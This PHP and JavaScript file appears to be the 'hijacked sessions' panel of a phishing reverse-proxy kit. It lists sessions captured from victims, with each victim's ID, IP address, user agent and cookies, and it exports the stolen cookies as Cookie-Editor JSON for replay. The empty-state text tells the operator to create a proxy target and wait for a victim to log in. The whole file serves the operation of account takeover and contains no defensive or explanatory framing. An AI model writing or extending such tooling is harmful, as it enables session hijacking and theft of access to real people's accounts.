<?php
/**
 * route-sessions.php — Hijacked sessions panel view.
 * Shows captured sessions with Cookie-Editor export.
 */
$db = store_open();
$sessions = store_session_list();
$slugs = array_unique(array_column($sessions, 'target_slug'));
?>
<section class="sess-section">

  <!-- ── HEADER ──────────────────────────────────────────── -->
  <div class="sess-header">
    <div class="sess-header-left">
      <h2 class="sess-title">// hijacked sessions</h2>
      <span class="badge badge-cyan"><?= count($sessions) ?> session<?= count($sessions) !== 1 ? 's' : '' ?></span>
    </div>
    <div class="sess-header-actions">
      <?php if (!empty($slugs)): ?>
      <select class="form-input sess-filter-select" id="session-filter-slug" onchange="filterSessions()">
        <option value="">All targets</option>
        <?php foreach ($slugs as $s): ?>
          <option value="<?= htmlspecialchars($s) ?>"><?= htmlspecialchars($s) ?></option>
        <?php endforeach; ?>
      </select>
      <?php endif; ?>
    </div>
  </div>

  <?php if (empty($sessions)): ?>
  <!-- ── EMPTY STATE ──────────────────────────────────────── -->
  <div class="sess-empty">
    <div class="sess-empty-icon">
      <svg class="icon icon-xl"><use href="#i-lock"/></svg>
    </div>
    <div class="sess-empty-title">No hijacked sessions</div>
    <div class="sess-empty-sub">Sessions are captured automatically when a proxy-mode target detects a successful login. Create a proxy target and wait for a victim to authenticate.</div>
  </div>

  <?php else: ?>
  <!-- ── TABLE ────────────────────────────────────────────── -->
  <div class="sess-table-wrap">
    <table class="data-table" id="sessions-table">
      <thead>
        <tr>
          <th>ID</th>
          <th>Target</th>
          <th>Victim</th>
          <th>IP</th>
          <th>Cookies</th>
          <th>Verdict</th>
          <th>Time</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php foreach ($sessions as $s): ?>
        <tr data-slug="<?= htmlspecialchars($s['target_slug']) ?>" data-id="<?= $s['id'] ?>">
          <td class="mono" style="color:var(--text-muted)">#<?= $s['id'] ?></td>
          <td><span class="sess-target-badge"><?= htmlspecialchars($s['target_slug']) ?></span></td>
          <td class="mono" title="<?= htmlspecialchars($s['victim_id']) ?>" style="color:var(--text-secondary)"><?= htmlspecialchars(substr($s['victim_id'], 0, 12)) ?>…</td>
          <td class="mono" style="color:var(--text-secondary)"><?= htmlspecialchars($s['ip']) ?></td>
          <td>
            <span class="sess-cookie-count"><?= count($s['cookie_editor']) ?></span>
          </td>
          <td>
            <?php if ($s['verdict'] === 'success'): ?>
              <span class="sess-verdict sess-verdict-ok">success</span>
            <?php elseif ($s['verdict'] === 'failure'): ?>
              <span class="sess-verdict sess-verdict-fail">failure</span>
            <?php else: ?>
              <span class="sess-verdict sess-verdict-unk"><?= htmlspecialchars($s['verdict']) ?></span>
            <?php endif; ?>
          </td>
          <td class="mono" title="<?= date('Y-m-d H:i:s', $s['captured_at']) ?>" style="font-size:var(--text-xs);color:var(--text-muted)">
            <?= date('M j H:i', $s['captured_at']) ?>
          </td>
          <td>
            <div class="sess-actions">
              <a href="api/sessions.php?action=export&id=<?= $s['id'] ?>" class="btn btn-outline btn-xs" title="Download Cookie-Editor JSON">
                <svg class="icon icon-sm"><use href="#i-download"/></svg>
              </a>
              <button class="btn btn-outline btn-xs" onclick="viewSession(<?= $s['id'] ?>)" title="View details">
                <svg class="icon icon-sm"><use href="#i-eye"/></svg>
              </button>
              <button class="btn btn-outline btn-xs sess-btn-danger" onclick="deleteSession(<?= $s['id'] ?>)" title="Delete">
                <svg class="icon icon-sm"><use href="#i-trash"/></svg>
              </button>
            </div>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
  <?php endif; ?>

</section>

<!-- Session Detail Modal -->
<div class="modal-scrim" id="modal-session" onclick="handleScrimClick(event,'modal-session')">
  <div class="modal modal-lg" onclick="event.stopPropagation()">
    <div class="modal-header">
      <div class="modal-header-left">
        <div class="modal-icon modal-icon-cyan"><svg class="icon icon-md"><use href="#i-lock"/></svg></div>
        <div>
          <div class="modal-title">SESSION DETAIL</div>
          <div class="modal-subtitle" id="session-modal-sub">// loading…</div>
        </div>
      </div>
      <button type="button" class="modal-x" onclick="closeModal('modal-session')"><svg class="icon icon-sm"><use href="#i-x"/></svg></button>
    </div>
    <div class="modal-body" id="session-modal-body" style="max-height:60vh;overflow:auto">
      <div class="upd-progress"><svg class="icon icon-sm spin"><use href="#i-loader"/></svg> Loading…</div>
    </div>
    <div class="modal-footer">
      <button type="button" class="btn btn-ghost btn-sm" onclick="closeModal('modal-session')">Close</button>
      <a href="#" class="btn btn-primary btn-sm" id="session-export-btn">
        <svg class="icon icon-sm"><use href="#i-download"/></svg>
        Export Cookie-Editor JSON
      </a>
    </div>
  </div>
</div>

<script>
function filterSessions() {
  const slug = document.getElementById('session-filter-slug').value;
  document.querySelectorAll('#sessions-table tbody tr').forEach(tr => {
    tr.style.display = (!slug || tr.dataset.slug === slug) ? '' : 'none';
  });
}

async function viewSession(id) {
  const body = document.getElementById('session-modal-body');
  const sub = document.getElementById('session-modal-sub');
  const exportBtn = document.getElementById('session-export-btn');
  body.innerHTML = '<div class="upd-progress"><svg class="icon icon-sm spin"><use href="#i-loader"/></svg> Loading…</div>';
  sub.textContent = '// session #' + id;
  exportBtn.href = 'api/sessions.php?action=export&id=' + id;
  openModal('modal-session');

  try {
    const res = await fetch('api/sessions.php?action=get&id=' + id);
    const json = await res.json();
    if (!json.ok) throw new Error(json.error);
    const s = json.session;
    sub.textContent = '// ' + s.target_slug + ' · ' + s.victim_id.slice(0,12) + '…';

    let html = '<div class="sess-detail-grid">';
    html += '<div class="sess-detail-item"><div class="sess-detail-label">Target</div><div class="sess-detail-value mono">' + esc(s.target_slug) + '</div></div>';
    html += '<div class="sess-detail-item"><div class="sess-detail-label">Victim ID</div><div class="sess-detail-value mono" style="word-break:break-all">' + esc(s.victim_id) + '</div></div>';
    html += '<div class="sess-detail-item"><div class="sess-detail-label">IP Address</div><div class="sess-detail-value mono">' + esc(s.ip) + '</div></div>';
    html += '<div class="sess-detail-item"><div class="sess-detail-label">Verdict</div><div class="sess-detail-value">';
    if (s.verdict === 'success') html += '<span class="sess-verdict sess-verdict-ok">success</span>';
    else if (s.verdict === 'failure') html += '<span class="sess-verdict sess-verdict-fail">failure</span>';
    else html += '<span class="sess-verdict sess-verdict-unk">' + esc(s.verdict) + '</span>';
    html += '</div></div>';
    html += '</div>';

    html += '<div class="sess-detail-label" style="margin-bottom:var(--space-2)">User Agent</div>';
    html += '<div class="sess-detail-ua">' + esc(s.ua) + '</div>';

    html += '<div class="sess-detail-label" style="margin-bottom:var(--space-2)">Cookie-Editor JSON (' + s.cookie_editor.length + ' cookies)</div>';
    html += '<pre class="sess-detail-json">';
    html += esc(JSON.stringify(s.cookie_editor, null, 2));
    html += '</pre>';

    body.innerHTML = html;
  } catch (e) {
    body.innerHTML = '<div class="alert alert-error"><div class="alert-icon"><svg class="icon icon-md"><use href="#i-alert-octagon"/></svg></div><div class="alert-content"><div class="alert-title">ERROR</div><div class="alert-body">' + esc(e.message) + '</div></div></div>';
  }
}

function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

async function deleteSession(id) {
  if (!confirm('Delete session #' + id + '?')) return;
  const fd = new FormData();
  fd.append('action', 'delete');
  fd.append('id', id);
  try {
    const res = await fetch('api/sessions.php', { method: 'POST', body: fd });
    const json = await res.json();
    if (json.ok) {
      const row = document.querySelector('#sessions-table tr[data-id="' + id + '"]');
      if (row) row.remove();
      if (typeof fireToast === 'function') fireToast('success', 'DELETED', 'Session #' + id + ' removed.');
    }
  } catch (e) {
    if (typeof fireToast === 'function') fireToast('error', 'ERROR', e.message);
  }
}
</script>

<style>
.sess-section { display: flex; flex-direction: column; gap: var(--space-5); }

/* ── Header ───────────────────────────────────────── */
.sess-header {
  display: flex; justify-content: space-between; align-items: center;
  flex-wrap: wrap; gap: var(--space-3);
}
.sess-header-left {
  display: flex; align-items: center; gap: var(--space-3);
}
.sess-title {
  color: var(--text-muted);
  font-family: var(--font-mono);
  font-size: var(--text-sm); font-weight: 500; margin: 0;
  letter-spacing: .04em;
}
.sess-header-actions {
  display: flex; gap: var(--space-2); align-items: center;
}
.sess-filter-select {
  font-size: var(--text-sm); padding: 4px 8px;
  max-width: 240px;
  font-family: var(--font-mono);
}

/* ── Table ────────────────────────────────────────── */
.sess-table-wrap {
  background: var(--bg-surface);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-lg);
  overflow-x: auto;
}
.sess-table-wrap .data-table th {
  position: sticky; top: 0;
  background: var(--bg-raised);
}

.sess-target-badge {
  display: inline-block;
  padding: 2px 8px;
  font-family: var(--font-mono); font-size: var(--text-xs); font-weight: 500;
  color: var(--accent-primary);
  background: rgba(0,229,255,0.08);
  border: 1px solid rgba(0,229,255,0.20);
  border-radius: var(--radius-pill);
  white-space: nowrap;
}

.sess-cookie-count {
  font-family: var(--font-mono); font-weight: 600;
  color: var(--text-primary);
}

/* Verdict badges */
.sess-verdict {
  display: inline-block;
  padding: 2px 8px;
  font-family: var(--font-mono); font-size: var(--text-xs); font-weight: 600;
  border-radius: var(--radius-pill);
  white-space: nowrap;
}
.sess-verdict-ok {
  color: var(--accent-green);
  background: rgba(57,255,20,0.08);
  border: 1px solid rgba(57,255,20,0.20);
}
.sess-verdict-fail {
  color: var(--accent-red);
  background: rgba(255,45,85,0.08);
  border: 1px solid rgba(255,45,85,0.20);
}
.sess-verdict-unk {
  color: var(--text-muted);
  background: var(--bg-raised);
  border: 1px solid var(--border-subtle);
}

/* Action buttons row */
.sess-actions { display: flex; gap: 6px; }
.sess-btn-danger { color: var(--accent-red); border-color: var(--accent-red-glow); }
.sess-btn-danger:hover { background: rgba(255,45,85,.08); box-shadow: var(--glow-red-sm); }

/* ── Empty state ──────────────────────────────────── */
.sess-empty {
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  gap: var(--space-3);
  padding: var(--space-8) var(--space-5);
  text-align: center;
}
.sess-empty-icon {
  width: 56px; height: 56px;
  display: flex; align-items: center; justify-content: center;
  background: var(--accent-primary-muted);
  border: 1px solid var(--accent-primary-glow);
  border-radius: var(--radius-lg);
  color: var(--accent-primary);
}
.sess-empty-icon .icon { width: 28px; height: 28px; }
.sess-empty-title {
  color: var(--text-primary);
  font-family: var(--font-mono);
  font-size: var(--text-md); font-weight: 600;
  letter-spacing: .02em;
}
.sess-empty-sub {
  color: var(--text-muted);
  font-size: var(--text-sm);
  max-width: 400px; line-height: var(--leading-normal);
}

/* ── Modal detail ─────────────────────────────────── */
.sess-detail-grid {
  display: grid; grid-template-columns: 1fr 1fr;
  gap: var(--space-3); margin-bottom: var(--space-4);
}
.sess-detail-item {}
.sess-detail-label {
  color: var(--text-muted);
  font-family: var(--font-mono);
  font-size: var(--text-xs);
  text-transform: uppercase; letter-spacing: .06em;
  margin-bottom: var(--space-1);
}
.sess-detail-value {
  color: var(--text-primary);
  font-size: var(--text-sm);
}
.sess-detail-ua {
  font-family: var(--font-mono); font-size: var(--text-xs);
  word-break: break-all; color: var(--text-secondary);
  margin-bottom: var(--space-4);
  padding: var(--space-2) var(--space-3);
  background: var(--bg-raised);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
}
.sess-detail-json {
  background: var(--bg-void);
  padding: var(--space-3);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-md);
  font-family: var(--font-mono); font-size: var(--text-xs);
  color: var(--text-code);
  overflow-x: auto; max-height: 300px;
  line-height: var(--leading-normal);
}
</style>
